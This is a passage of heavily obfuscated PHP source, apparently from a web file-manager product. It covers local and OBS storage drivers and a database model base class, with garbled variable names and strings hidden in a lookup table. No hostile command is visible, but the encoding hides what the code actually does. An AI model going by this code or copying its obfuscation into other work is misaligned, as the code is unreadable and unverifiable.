$this->iconvApp($this->pathThis($Ãë»”×­)); if ($ƒ‘ØÅ±”) { return array($İÇ¼öôœ[32] => $÷üÛí¸Ò, $İÇ¼öôœ[97] => $this->getPathOuter($Ãë»”×­), $İÇ¼öôœ[33] => $İÇ¼öôœ[88]); } $¯¾Œˆö´ = array($İÇ¼öôœ[32] => $÷üÛí¸Ò, $İÇ¼öôœ[97] => $this->getPathOuter($Ãë»”×­), $İÇ¼öôœ[33] => $İÇ¼öôœ[88], $İÇ¼öôœ[241] => @filectime($Ãë»”×­), $İÇ¼öôœ[98] => @filemtime($Ãë»”×­), $İÇ¼öôœ[1455] => @fileatime($Ãë»”×­), $İÇ¼öôœ[1456] => is_readable($Ãë»”×­), $İÇ¼öôœ[1457] => is_writable($Ãë»”×­), $İÇ¼öôœ[1458] => get_mode($Ãë»”×­)); return $¯¾Œˆö´; } private function fileInfo($½¤çá‰©, $¬—ğ–Ğš = false) { $ª¿­âÑ =& $_SERVER[ÕŸ²ó÷å]; $¶åıÜÑ = $this->iconvApp($this->pathThis($½¤çá‰©)); if ($¬—ğ–Ğš) { return array($ª¿­âÑ[32] => $¶åıÜÑ, $ª¿­âÑ[97] => $this->getPathOuter($½¤çá‰©), $ª¿­âÑ[33] => $ª¿­âÑ[240], $ª¿­âÑ[89] => $this->size($½¤çá‰©), $ª¿­âÑ[179] => $this->ext($¶åıÜÑ)); } $àƒº¡­’ = array($ª¿­âÑ[32] => $¶åıÜÑ, $ª¿­âÑ[97] => $this->getPathOuter($½¤çá‰©), $ª¿­âÑ[33] => $ª¿­âÑ[240], $ª¿­âÑ[241] => @filectime($½¤çá‰©), $ª¿­âÑ[98] => @filemtime($½¤çá‰©), $ª¿­âÑ[1455] => @fileatime($½¤çá‰©), $ª¿­âÑ[89] => $this->size($½¤çá‰©), $ª¿­âÑ[179] => $this->ext($¶åıÜÑ), $ª¿­âÑ[1456] => is_readable($½¤çá‰©), $ª¿­âÑ[1457] => is_writable($½¤çá‰©), $ª¿­âÑ[1458] => get_mode($½¤çá‰©)); return $àƒº¡­’; } public function exist($«˜ß½Ş‚) { $«˜ß½Ş‚ = $this->iconvSystem($«˜ß½Ş‚); return @file_exists($«˜ß½Ş‚); } public function isFile($ü½¤¦Ü¥) { $ü½¤¦Ü¥ = $this->iconvSystem($ü½¤¦Ü¥); return @is_file($ü½¤¦Ü¥); } public function isFolder($È¶£Óïú) { $È¶£Óïú = $this->iconvSystem($È¶£Óïú); return @is_dir($È¶£Óïú); } public function listPath($¢î¡¬ê, $ßâ…§˜¯ = false) { $ÇÉ•¯ú =& $_SERVER[ÕŸ²ó÷å]; $¢î¡¬ê = $this->iconvSystem($¢î¡¬ê); $¢î¡¬ê = rtrim($¢î¡¬ê, $ÇÉ•¯ú[8]) . $ÇÉ•¯ú[8]; $ƒµ²°à = array($ÇÉ•¯ú[95] => array(), $ÇÉ•¯ú[96] => array()); if (!($Ìà…‡ÓÙ = @opendir($¢î¡¬ê))) { return $ƒµ²°à; } while (($€ªëÖò = readdir($Ìà…‡ÓÙ)) !== !1) { if ($€ªëÖò == $ÇÉ•¯ú[10] || $€ªëÖò == $ÇÉ•¯ú[1366]) { continue; } $Ğíª«À™ = $¢î¡¬ê . $€ªëÖò; if (is_file($Ğíª«À™)) { $ƒµ²°à[$ÇÉ•¯ú[96]][] = $this->fileInfo($Ğíª«À™, $ßâ…§˜¯); } else { $ƒµ²°à[$ÇÉ•¯ú[95]][] = $this->folderInfo($Ğíª«À™, $ßâ…§˜¯); } } closedir($Ìà…‡ÓÙ); return $ƒµ²°à; } public function listAll($‰ğîÅ«€, &$æ¶•íã„ = array()) { $å¨ÊÍÁÃ =& $_SERVER[ÕŸ²ó÷å]; $‰ğîÅ«€ = $this->iconvSystem($‰ğîÅ«€); $‰ğîÅ«€ = rtrim($‰ğîÅ«€, $å¨ÊÍÁÃ[8]) . $å¨ÊÍÁÃ[8]; if (!($²Íû®äÊ = @opendir($‰ğîÅ«€))) { return $æ¶•íã„; } while (($â×ÊÇ = readdir($²Íû®äÊ)) !== !1) { if ($â×ÊÇ == $å¨ÊÍÁÃ[10] || $â×ÊÇ == $å¨ÊÍÁÃ[1366]) { continue; } $µŠÑïóü = $‰ğîÅ«€ . $â×ÊÇ; $Üéôöé× = is_dir($µŠÑïóü) && !is_link($µŠÑïóü) ? 1 : 0; $µŠÑïóü = $Üéôöé× ? $µŠÑïóü . $å¨ÊÍÁÃ[8] : $µŠÑïóü; $æ¶•íã„[] = array($å¨ÊÍÁÃ[97] => $µŠÑïóü, $å¨ÊÍÁÃ[88] => $Üéôöé×, $å¨ÊÍÁÃ[98] => intval(@filemtime($µŠÑïóü)), $å¨ÊÍÁÃ[89] => $Üéôöé× ? 0 : intval($this->size($µŠÑïóü))); if ($Üéôöé×) { $this->listAll($µŠÑïóü, $æ¶•íã„); } } closedir($²Íû®äÊ); return $æ¶•íã„; } public function has($¿òÏûç, $¡Òç¹‹… = false, $Ê¨…«’£ = true) { $óµõº›ó =& $_SERVER[ÕŸ²ó÷å]; $¿òÏûç = $this->iconvSystem($¿òÏûç); $¿òÏûç = rtrim($¿òÏûç, $óµõº›ó[8]) . $óµõº›ó[8]; if (!($úÜßË³ø = @opendir($¿òÏûç))) { return !1; } $›ôƒØ‚ = 0; $‚“Í©ö = 0; $¶¾‡æÙˆ = 0; while (($—ÛÃîËò = readdir($úÜßË³ø)) !== !1) { if ($—ÛÃîËò == $óµõº›ó[10] || $—ÛÃîËò == $óµõº›ó[1366]) { continue; } $À•ÜøãÇ = $¿òÏûç . $—ÛÃîËò; if ($¡Òç¹‹…) { $¶¾‡æÙˆ++; if (@is_file($À•ÜøãÇ)) { $›ôƒØ‚++; } else { $‚“Í©ö++; } if ($¶¾‡æÙˆ > 10000) { break; } continue; } if ($Ê¨…«’£) { if (@is_file($À•ÜøãÇ)) { return !0; } } else { if (@is_dir($À•ÜøãÇ . $óµõº›ó[8])) { return !0; } } } closedir($úÜßË³ø); if ($¡Òç¹‹…) { return array($óµõº›ó[249] => $›ôƒØ‚, $óµõº›ó[250] => $‚“Í©ö); } return !1; } public function hashSimple($öÒìŞ÷É) { $ÇÅ¨–ıñ =& $_SERVER[ÕŸ²ó÷å]; if (!$öÒìŞ÷É) { return md5($ÇÅ¨–ıñ[12]); } $öÒìŞ÷É = $this->iconvSystem($öÒìŞ÷É); $¤ñê´Ê = $this->size($öÒìŞ÷É); $Çƒ¼„Ø„ = 200; $õÚ‡±…¢ = 50; if ($¤ñê´Ê <= $Çƒ¼„Ø„ * $õÚ‡±…¢) { return $this->hashMd5($öÒìŞ÷É) . $¤ñê´Ê; } $â²Ëßç€ = $ÇÅ¨–ıñ[12]; $Ñ˜¢ÎÂ = intval($¤ñê´Ê / $õÚ‡±…¢); $·ˆüÀ­Í = fopen($öÒìŞ÷É, $ÇÅ¨–ıñ[1459]); if (!$·ˆüÀ­Í) { return $â²Ëßç€; } for ($¹¸õûİµ = 0; $¹¸õûİµ < $õÚ‡±…¢; $¹¸õûİµ++) { fseek_64($·ˆüÀ­Í, $Ñ˜¢ÎÂ * $¹¸õûİµ); $â²Ëßç€ .= fread($·ˆüÀ­Í, $Çƒ¼„Ø„); } fseek_64($·ˆüÀ­Í, $¤ñê´Ê - $Çƒ¼„Ø„); $â²Ëßç€ .= fread($·ˆüÀ­Í, $Çƒ¼„Ø„); fclose($·ˆüÀ­Í); return md5($â²Ëßç€) . $¤ñê´Ê; } public function getContent($Ä°¬Œâ) { $Ä°¬Œâ = $this->iconvSystem($Ä°¬Œâ); return file_get_contents($Ä°¬Œâ); } public function setContent($ê¬äğõˆ, $ÀÌ¸â÷¶ = '') { $ê¬äğõˆ = $this->iconvSystem($ê¬äğõˆ); $·Ì—æó– = @file_put_contents($ê¬äğõˆ, $ÀÌ¸â÷¶, LOCK_EX); if (!$·Ì—æó–) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); } clearstatcache(); @chmod($ê¬äğõˆ, $this->pathAuth); return $·Ì—æó– === !1 ? !1 : !0; } public function fileSubstr($àÊæ©¨‘, $†´ò§ÛÛ = 0, $œ¾‚»òÑ = false) { $Œ â¡Ñ– =& $_SERVER[ÕŸ²ó÷å]; $àÊæ©¨‘ = $this->iconvSystem($àÊæ©¨‘); if ($œ¾‚»òÑ === !1) { $œ¾‚»òÑ = $this->size($àÊæ©¨‘); } if ($œ¾‚»òÑ <= 0) { return $Œ â¡Ñ–[12]; } $‚Ò‚”İÈ = fopen($àÊæ©¨‘, $Œ â¡Ñ–[1459]); if (!$‚Ò‚”İÈ) { return !1; } fseek_64($‚Ò‚”İÈ, $†´ò§ÛÛ); $¤£ÂÃ” = fread($‚Ò‚”İÈ, $œ¾‚»òÑ); fclose($‚Ò‚”İÈ); if (!$¤£ÂÃ”) { $this->writeLog(__FUNCTION__ . $Œ â¡Ñ–[1451], !0); } return $¤£ÂÃ”; } public function upload($ ü¼Äç, $Ğ³Äù‚, $‘Àø’äà = false, $ÒÑé±àˆ = REPEAT_REPLACE) { if ($‘Àø’äà) { return $this->moveFile($Ğ³Äù‚, $ ü¼Äç); } return $this->copyFile($Ğ³Äù‚, $ ü¼Äç); } public function setModifyTime($øÅ‰ÙÛ®, $·´É¢ã¼ = '') { @touch($øÅ‰ÙÛ®, intval($·´É¢ã¼)); } public function download($“¸Å˜”, $˜›ŠôÆì) { return $this->iconvSystem($“¸Å˜”); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¼æü†ûç) { parent::__construct($¼æü†ûç); $this->setSignVersion($_SERVER[ÕŸ²ó÷å][257]); } public function fileOutImage($‰‘¡•‰­, $‹‹æ€¨ = 250) { $•Ñ‘ĞÖÒ =& $_SERVER[ÕŸ²ó÷å]; if ($this->size($‰‘¡•‰­) > 1024 * 1024 * 25) { return $this->fileOutImageServer($‰‘¡•‰­, $‹‹æ€¨); } $Ú· ‰øœ = array($•Ñ‘ĞÖÒ[1460] => $•Ñ‘ĞÖÒ[1461] . $‹‹æ€¨ . $•Ñ‘ĞÖÒ[1462]); $Ï¼ëè’ç = $this->link($‰‘¡•‰­, $Ú· ‰øœ); $this->fileOutLink($Ï¼ëè’ç); } public function fileOutLink($ç¦×°óƒ) { $ªàÊÕÜ€ =& $_SERVER[ÕŸ²ó÷å]; if (substr($ç¦×°óƒ, 0, 7) == $ªàÊÕÜ€[322]) { $ç¦×°óƒ = $ªàÊÕÜ€[323] . substr($ç¦×°óƒ, 7); } header($ªàÊÕÜ€[185] . $ç¦×°óƒ); die; } } goto Bµ“Áœ”ñ; Cî…’Ë„Ã•: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\x66\x79\x54\x69\x6d\145", "\164\x69\155\x65", "\x69\156\x73\x65\162\164\54\x75\x70\x64\x61\164\x65", "\146\165\156\143\x74\151\x6f\x6e"), array("\143\162\145\141\164\x65\124\x69\x6d\145", "\164\151\155\x65", "\151\x6e\163\145\x72\x74", "\x66\165\156\x63\164\151\157\156")); public function setDataAuto($ûÓ‹ÅÈÈ) { $this->dataAuto = $ûÓ‹ÅÈÈ; } public function __construct($ëüÜâÏ = '', $Ò¯Á¼Ò™ = '', $ê•ºÆ˜Ô = '') { parent::__construct($ëüÜâÏ, $Ò¯Á¼Ò™, $ê•ºÆ˜Ô); } protected $tableMeta = array(); protected function _beforeInsert(&$ñÏ¿‚›œ, $•´¬¼¼ä) { $ã³öŸ¾ß =& $_SERVER[ÕŸ²ó÷å]; if (!$this->checkDataAutoHas($ã³öŸ¾ß[440])) { return; } $this->dataBeforeFilter($ñÏ¿‚›œ, $ã³öŸ¾ß[440]); } protected function _beforeUpdate(&$ü¾é‹ÒÚ, $†—Ş¾´ş) { $®¡æ‹«Ê =& $_SERVER[ÕŸ²ó÷å]; if (!$this->checkDataAutoHas($®¡æ‹«Ê[441])) { return; } $this->dataBeforeFilter($ü¾é‹ÒÚ, $®¡æ‹«Ê[441]); } protected function _afterSelect(&$üŸ®åë, $Ş€¤ùØÁ) { if (!is_array($üŸ®åë)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÕŸ²ó÷å][442])) { return; } foreach ($üŸ®åë as &$ÏÙÁÔê) { $this->dataAfterFilter($ÏÙÁÔê); } unset($ÏÙÁÔê); } protected function _afterFind(&$–‡ÇÀÏ, $ÊåÚ‘ÏÎ) { if (!is_array($–‡ÇÀÏ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÕŸ²ó÷å][442])) { return; } $this->dataAfterFilter($–‡ÇÀÏ); } public static function textEncode($Ä¥§¢®Œ) { if (!$Ä¥§¢®Œ) { return $Ä¥§¢®Œ; } $éˆë¯öù = json_encode($Ä¥§¢®Œ); $éˆë¯öù = preg_replace_callback($_SERVER[ÕŸ²ó÷å][443], function ($ì§õ½±) { return addslashes($ì§õ½±[0]); }, $éˆë¯öù); return json_decode($éˆë¯öù); } public static function textDecode($Õ—Â›ı­) { $Î¾§íæ =& $_SERVER[ÕŸ²ó÷å]; $¶èÚ‰”ß = json_encode($Õ—Â›ı­); $¶èÚ‰”ß = preg_replace_callback($Î¾§íæ[444], function ($š‡øË¸Ê) { return $_SERVER[ÕŸ²ó÷å][110]; }, $¶èÚ‰”ß); return json_decode($¶èÚ‰”ß); } public function setAutoIncrement($æ‘ìŠÅ) { $³ÑÊª³ô = array($this->getPk() => $æ‘ìŠÅ); $‚ÊóêáË = $this->data($³ÑÊª³ô)->add(); if ($‚ÊóêáË) { $this->delete($‚ÊóêáË); } } public function getAutoIncrement() { $ÜŞÉ§ö = $this->getTableName(); $ˆµŒĞ¿ = $this->max($this->getPk()); $“¾šñ = $this->query("\163\150\157\167\x20\164\141\142\154\x65\x20\x73\164\141\164\x75\x73\40\x77\x68\145\162\x65\40\116\x61\x6d\x65\x3d\x27{$ÜŞÉ§ö}\x27"); $½ÌÓ™Ïâ = $“¾šñ[0][$_SERVER[ÕŸ²ó÷å][445]]; $Ãú¾ıÇ = max($ˆµŒĞ¿, $½ÌÓ™Ïâ); return $Ãú¾ıÇ; } protected function _callBefore($¶²­÷ó, $şŸö´õ–) { return $this->cacheCallCheck($¶²­÷ó, $şŸö´õ–, !1); } protected function _callAfter($ğ½’ëË, $ú«üƒ‚) { return $this->cacheCallCheck($ğ½’ëË, $ú«üƒ‚, !0); } protected function cacheFunctionAlias($€…ü„ÕÌ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($‡è¸›¤ƒ, $şÓœŞ¢¸, $€†½·ñ’ = false) { $™Ä“§‹˜ = $this->cacheFunctionAlias($şÓœŞ¢¸); if (!$™Ä“§‹˜) { return; } foreach ($™Ä“§‹˜ as $ºéí…«é => $’È©Ïô´) { $¾Øö¦Ò… = $’È©Ïô´[0]; $êíñ¯á¢ = explode($_SERVER[ÕŸ²ó÷å][50], $’È©Ïô´[1]); if ($‡è¸›¤ƒ == $ºéí…«é) { return $this->cacheFunctionGet($ºéí…«é, $¾Øö¦Ò…); } if ($€†½·ñ’ && in_array($‡è¸›¤ƒ, $êíñ¯á¢)) { $this->cacheFunctionClear($ºéí…«é, $¾Øö¦Ò…); } } } public function cacheFunctionGet($«åüú³, $Î‹‚â°) { $²Ğ¨Åù° = $this->cacheKeyMake($«åüú³, $Î‹‚â°); $ÆÛéĞÎ = Cache::get($²Ğ¨Åù°); if (!is_array($ÆÛéĞÎ)) { $ÆÛéĞÎ = call_user_func_array(array($this, $«åüú³), array($Î‹‚â°, !0)); Cache::set($²Ğ¨Åù°, $ÆÛéĞÎ); } return $ÆÛéĞÎ; } public function cacheFunctionClear($¤Ú‰ˆÖÜ, $›š“Ìåâ) { $°„ ÉöØ = $›š“Ìåâ; if (!is_array($›š“Ìåâ)) { $°„ ÉöØ = array($›š“Ìåâ); } foreach ($°„ ÉöØ as $÷½ŠµÚ) { $¤çöûï¹ = $this->cacheKeyMake($¤Ú‰ˆÖÜ, $÷½ŠµÚ); Cache::remove($¤çöûï¹); } } private function cacheKeyMake($ŸèÌÎ§Â, $È¸÷ëÆñ) { $à‰¸‚÷¿ =& $_SERVER[ÕŸ²ó÷å]; return get_class($this) . $à‰¸‚÷¿[11] . $ŸèÌÎ§Â . $à‰¸‚÷¿[446] . $È¸÷ëÆñ; } protected function selectPageReset() { $¹Ö×½¯ü =& $_SERVER[ÕŸ²ó÷å]; if (isset($GLOBALS[$¹Ö×½¯ü[447]])) { return; } $GLOBALS[$¹Ö×½¯ü[447]] = isset($GLOBALS[$¹Ö×½¯ü[7]][$¹Ö×½¯ü[448]]) ? $GLOBALS[$¹Ö×½¯ü[7]][$¹Ö×½¯ü[448]] : !1; $GLOBALS[$¹Ö×½¯ü[449]] = isset($GLOBALS[$¹Ö×½¯ü[7]][$¹Ö×½¯ü[438]]) ? $GLOBALS[$¹Ö×½¯ü[7]][$¹Ö×½¯ü[438]] : !1; $GLOBALS[$¹Ö×½¯ü[7]][$¹Ö×½¯ü[448]] = !1; $GLOBALS[$¹Ö×½¯ü[7]][$¹Ö×½¯ü[438]] = !1; } protected function selectPageRestore() { $™ŸŸìÛş =& $_SERVER[ÕŸ²ó÷å]; if (!isset($GLOBALS[$™ŸŸìÛş[447]])) { return; } $GLOBALS[$™ŸŸìÛş[7]][$™ŸŸìÛş[448]] = $GLOBALS[$™ŸŸìÛş[447]]; $GLOBALS[$™ŸŸìÛş[7]][$™ŸŸìÛş[438]] = $GLOBALS[$™ŸŸìÛş[449]]; if ($GLOBALS[$™ŸŸìÛş[7]][$™ŸŸìÛş[448]] === !1) { unset($GLOBALS[$™ŸŸìÛş[7]][$™ŸŸìÛş[448]]); } if ($GLOBALS[$™ŸŸìÛş[7]][$™ŸŸìÛş[438]] === !1) { unset($GLOBALS[$™ŸŸìÛş[7]][$™ŸŸìÛş[438]]); } unset($GLOBALS[$™ŸŸìÛş[447]]); unset($GLOBALS[$™ŸŸìÛş[449]]); } protected function selectPage($ğ°Ëø¼ø = 200, $ Û¤÷Ã¢ = 1) { $ßêÏ¥Çœ =& $_SERVER[ÕŸ²ó÷å]; global $in; $²Õ¼°¼¼ = $this->optionsValue(); $»¾åØì = 50000; $ğ°Ëø¼ø = isset($in[$ßêÏ¥Çœ[448]]) && $in[$ßêÏ¥Çœ[448]] ? $in[$ßêÏ¥Çœ[448]] : $ğ°Ëø¼ø; if ($ğ°Ëø¼ø === -1) { $in[$ßêÏ¥Çœ[448]] = !1; $»¾åØì = 100000000; $ğ°Ëø¼ø = $»¾åØì; } $½ÂËÉÜ« = $²Õ¼°¼¼; $½ÂËÉÜ«[$ßêÏ¥Çœ[450]] = array(); $ğ°Ëø¼ø = intval($ğ°Ëø¼ø); $ğ°Ëø¼ø = $ğ°Ëø¼ø <= 5 ? 5 : ($ğ°Ëø¼ø >= $»¾åØì ? $»¾åØì : $ğ°Ëø¼ø); $ Û¤÷Ã¢ = intval(isset($in[$ßêÏ¥Çœ[438]]) && $in[$ßêÏ¥Çœ[438]] ? $in[$ßêÏ¥Çœ[438]] : $ Û¤÷Ã¢); $ Û¤÷Ã¢ = $ Û¤÷Ã¢ <= 1 ? 1 : $ Û¤÷Ã¢; $¾£àà ã = array(); $ö„ÕÊ¹… = 1; if ($ Û¤÷Ã¢ == 1 && $ö„ÕÊ¹…) { $this->optionsValue($²Õ¼°¼¼); $¾£àà ã = $this->page($ Û¤÷Ã¢, $ğ°Ëø¼ø)->select(); $Í§Ø³æ = is_array($¾£àà ã) ? count($¾£àà ã) : 0; if ($Í§Ø³æ < $ğ°Ëø¼ø) { $äîêõšÎ = 1; } else { $this->optionsValue($½ÂËÉÜ«); $Í§Ø³æ = intval($this->count()); $äîêõšÎ = ceil($Í§Ø³æ / $ğ°Ëø¼ø); } } else { $this->optionsValue($½ÂËÉÜ«); $Í§Ø³æ = intval($this->count()); $äîêõšÎ = ceil($Í§Ø³æ / $ğ°Ëø¼ø); $ Û¤÷Ã¢ = $ Û¤÷Ã¢ >= $äîêõšÎ ? $äîêõšÎ : $ Û¤÷Ã¢; $this->optionsValue($²Õ¼°¼¼); $¾£àà ã = $this->page($ Û¤÷Ã¢, $ğ°Ëø¼ø)->select(); } if (!is_array($¾£àà ã)) { $¾£àà ã = array(); } if ($äîêõšÎ == 1) { $Í§Ø³æ = count($¾£àà ã); } $ÈÛõÌşé = array($ßêÏ¥Çœ[451] => array($ßêÏ¥Çœ[452] => $Í§Ø³æ, $ßêÏ¥Çœ[448] => $ğ°Ëø¼ø, $ßêÏ¥Çœ[438] => $ Û¤÷Ã¢, $ßêÏ¥Çœ[453] => $äîêõšÎ), $ßêÏ¥Çœ[454] => $¾£àà ã); return $ÈÛõÌşé; } protected function checkLength($£ÃëÄŸğ, $Ç¡éà– = 0, $­Ï¨ğ”Ó = '') { $›õ”¢æ§ =& $_SERVER[ÕŸ²ó÷å]; $Ç¡éà– = $Ç¡éà– ? $Ç¡éà– : 65536; if (!$£ÃëÄŸğ || strlen($£ÃëÄŸğ) < $Ç¡éà–) { return; } $­Ï¨ğ”Ó = $­Ï¨ğ”Ó ? $­Ï¨ğ”Ó . $›õ”¢æ§[84] : $›õ”¢æ§[12]; show_json($­Ï¨ğ”Ó . LNG($›õ”¢æ§[455]) . "\50{$Ç¡éà–}\51", !1); } protected function metaSet($èôÎŞá¹, $ó›¨¨Õ = null, $Å–Í­ = null) { $í†ûÒ½‚ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->tableMeta || !$èôÎŞá¹) { return !1; } $ÕÉ¦Â‰ó = $this->tableMeta[$í†ûÒ½‚[456]]; $„Ÿ®€Õ = $this->tableMeta[$í†ûÒ½‚[457]]; $´µæ›Ù© = Model($„Ÿ®€Õ); $ª»ÆÔ“ = array($ÕÉ¦Â‰ó => $èôÎŞá¹, $í†ûÒ½‚[458] => $ó›¨¨Õ); if (is_null($ó›¨¨Õ)) { return $´µæ›Ù©->where(array($ÕÉ¦Â‰ó => $èôÎŞá¹))->delete(); } if (is_null($Å–Í­) && is_string($ó›¨¨Õ)) { return $´µæ›Ù©->where($ª»ÆÔ“)->delete(); } $ËÆ†¶œ¼ = is_array($ó›¨¨Õ) ? $ó›¨¨Õ : array(); if (is_string($ó›¨¨Õ)) { $ËÆ†¶œ¼[$ó›¨¨Õ] = $Å–Í­; } $ˆ®«Ó˜¼ = array(); foreach ($ËÆ†¶œ¼ as $¨—ÎÉº => $šÊîÏ«û) { if (is_null($šÊîÏ«û) && is_string($¨—ÎÉº)) { $´µæ›Ù©->where(array($ÕÉ¦Â‰ó => $èôÎŞá¹, $í†ûÒ½‚[458] => $¨—ÎÉº))->delete(); continue; } $this->checkLength($šÊîÏ«û, !1, $„Ÿ®€Õ . $í†ûÒ½‚[4] . $¨—ÎÉº); $ˆ®«Ó˜¼[] = array($ÕÉ¦Â‰ó => $èôÎŞá¹, $í†ûÒ½‚[107] => $¨—ÎÉº, $í†ûÒ½‚[459] => $šÊîÏ«û); } $ø¹ã›ñ¦ = $í†ûÒ½‚[460] . $„Ÿ®€Õ; CacheLock::lock($ø¹ã›ñ¦); $´µæ›Ù©->where(array($ÕÉ¦Â‰ó => $èôÎŞá¹))->addAll($ˆ®«Ó˜¼, array(), !0); CacheLock::unlock($ø¹ã›ñ¦); return !0; } public function metaGet($¦‰ŒËË›, $…ñºèÀ¦ = false) { $¼íã”—ş =& $_SERVER[ÕŸ²ó÷å]; if (!$this->tableMeta) { return array(); } $è¡Ë‰ø“ = $this->tableMeta[$¼íã”—ş[456]]; $ä•ø¨© = Model($this->tableMeta[$¼íã”—ş[457]]); if ($…ñºèÀ¦) { $¯Ûó× = array($è¡Ë‰ø“ => $¦‰ŒËË›, $¼íã”—ş[107] => $…ñºèÀ¦); return $ä•ø¨©->where($¯Ûó×)->getField($¼íã”—ş[459]); } $¯Ûó× = array($è¡Ë‰ø“ => $¦‰ŒËË›); $Ä§®å©› = $ä•ø¨©->field($¼íã”—ş[461])->where($¯Ûó×)->select(); $Ä§®å©› = array_to_keyvalue($Ä§®å©›, $¼íã”—ş[107], $¼íã”—ş[459]); return $Ä§®å©›; } private function checkDataAutoHas($¶Ìéò£™) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $æ‹ëú) { if (in_array($¶Ìéò£™, explode($_SERVER[ÕŸ²ó÷å][50], $æ‹ëú[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ãÊ‘‘Ñ, $ëŒ½ÙŒË) { $ãåû»¼¼ =& $_SERVER[ÕŸ²ó÷å]; if (!is_array($ãÊ‘‘Ñ)) { return; } foreach ($this->dataAuto as $¹ĞÇ·³Ï) { $ëŸÓ·„˜ = $¹ĞÇ·³Ï[0]; if (!in_array($ëŒ½ÙŒË, explode($ãåû»¼¼[50], $¹ĞÇ·³Ï[2]))) { continue; } switch (trim($¹ĞÇ·³Ï[3])) { case $ãåû»¼¼[406]: case $ãåû»¼¼[407]: $½µàÔÛµ = $¹ĞÇ·³Ï[1]; $ì®’ö¾µ = isset($¹ĞÇ·³Ï[4]) ? (array) $¹ĞÇ·³Ï[4] : array(); if ($½µàÔÛµ == $ãåû»¼¼[216] && array_key_exists($ëŸÓ·„˜, $ãÊ‘‘Ñ)) { if (!$ãÊ‘‘Ñ[$ëŸÓ·„˜]) { unset($ãÊ‘‘Ñ[$ëŸÓ·„˜]); } break; } if (isset($ãÊ‘‘Ñ[$ëŸÓ·„˜])) { array_unshift($ì®’ö¾µ, $ãÊ‘‘Ñ[$ëŸÓ·„˜]); } if ($ãåû»¼¼[406] == $¹ĞÇ·³Ï[3]) { $ãÊ‘‘Ñ[$ëŸÓ·„˜] = call_user_func_array($½µàÔÛµ, $ì®’ö¾µ); } else { $ãÊ‘‘Ñ[$ëŸÓ·„˜] = call_user_func_array(array(&$this, $½µàÔÛµ), $ì®’ö¾µ); } break; case $ãåû»¼¼[356]: if (isset($ãÊ‘‘Ñ[$ëŸÓ·„˜]) && $ãÊ‘‘Ñ[$ëŸÓ·„˜]) { $ãÊ‘‘Ñ[$ëŸÓ·„˜] = call_user_func_array(array(&$this, $¹ĞÇ·³Ï[1]), array($ãÊ‘‘Ñ[$ëŸÓ·„˜])); } break; case $ãåû»¼¼[359]: $ãÊ‘‘Ñ[$ëŸÓ·„˜] = $ãÊ‘‘Ñ[$¹ĞÇ·³Ï[1]]; break; case $ãåû»¼¼[379]: if (isset($ãÊ‘‘Ñ[$ëŸÓ·„˜]) && !is_string($ãÊ‘‘Ñ[$ëŸÓ·„˜])) { $ãÊ‘‘Ñ[$ëŸÓ·„˜] = json_encode_force($ãÊ‘‘Ñ[$ëŸÓ·„˜]); } break; case $ãåû»¼¼[408]: if ($ãÊ‘‘Ñ[$ëŸÓ·„˜] === $ãåû»¼¼[12]) { unset($ãÊ‘‘Ñ[$ëŸÓ·„˜]); } break; case $ãåû»¼¼[409]: $ãÊ‘‘Ñ[$ëŸÓ·„˜] = $¹ĞÇ·³Ï[1]; default: break; } } if ($ëŒ½ÙŒË == $ãåû»¼¼[440]) { $‘ïıã©¢ = strtolower($this->db->getDbType()); if (strpos($‘ïıã©¢, $ãåû»¼¼[13]) !== 0) { return; } $´åäŞ÷Š = $this->field(!0)->fields; $‡ŞÍæ = $´åäŞ÷Š[$ãåû»¼¼[338]]; if (isset($´åäŞ÷Š[$ãåû»¼¼[337]])) { unset($‡ŞÍæ[$´åäŞ÷Š[$ãåû»¼¼[337]]]); } foreach ($‡ŞÍæ as $ùÒÇ”™… => $ëŒ½ÙŒË) { if (!isset($ãÊ‘‘Ñ[$ùÒÇ”™…])) { $ãÊ‘‘Ñ[$ùÒÇ”™…] = $ãåû»¼¼[12]; } } } } private function dataAfterFilter(&$¯˜İ¹Ù) { $…À’™Ş‹ =& $_SERVER[ÕŸ²ó÷å]; foreach ($this->dataAuto as $¿¾Šàäí) { $îØÍø = $¿¾Šàäí[0]; if (!isset($¯˜İ¹Ù[$îØÍø])) { continue; } if (!in_array($…À’™Ş‹[442], explode($…À’™Ş‹[50], $¿¾Šàäí[2]))) { continue; } switch (trim($¿¾Šàäí[3])) { case $…À’™Ş‹[406]: case $…À’™Ş‹[407]: $øÜøš° = isset($¿¾Šàäí[4]) ? (array) $¿¾Šàäí[4] : array(); array_unshift($øÜøš°, $¯˜İ¹Ù[$îØÍø]); if (isset($¿¾Šàäí[4]) && $¿¾Šàäí[4] == $…À’™Ş‹[462]) { $øÜøš° = array($¯˜İ¹Ù[$îØÍø]); } if ($…À’™Ş‹[406] == $¿¾Šàäí[3]) { $¯˜İ¹Ù[$îØÍø] = call_user_func_array($¿¾Šàäí[1], $øÜøš°); } else { $¯˜İ¹Ù[$îØÍø] = call_user_func_array(array(&$this, $¿¾Šàäí[1]), $øÜøš°); } break; case $…À’™Ş‹[356]: if (isset($¯˜İ¹Ù[$îØÍø]) && $¯˜İ¹Ù[$îØÍø]) { $¯˜İ¹Ù[$îØÍø] = call_user_func_array(array(&$this, $¿¾Šàäí[1]), array($¯˜İ¹Ù[$îØÍø])); } break; case $…À’™Ş‹[359]: $¯˜İ¹Ù[$îØÍø] = $¯˜İ¹Ù[$¿¾Šàäí[1]]; break; case $…À’™Ş‹[379]: $Ş¹÷ü• = $¯˜İ¹Ù[$îØÍø]; $¯˜İ¹Ù[$îØÍø] = json_decode($Ş¹÷ü•, !0); if (is_null($¯˜İ¹Ù[$îØÍø])) { $¯˜İ¹Ù[$îØÍø] = $Ş¹÷ü•; } break; case $…À’™Ş‹[408]: if ($¯˜İ¹Ù[$îØÍø] === $…À’™Ş‹[12]) { unset($¯˜İ¹Ù[$îØÍø]); } break; case $…À’™Ş‹[409]: $¯˜İ¹Ù[$îØÍø] = $¿¾Šàäí[1]; break; default: break; } } } 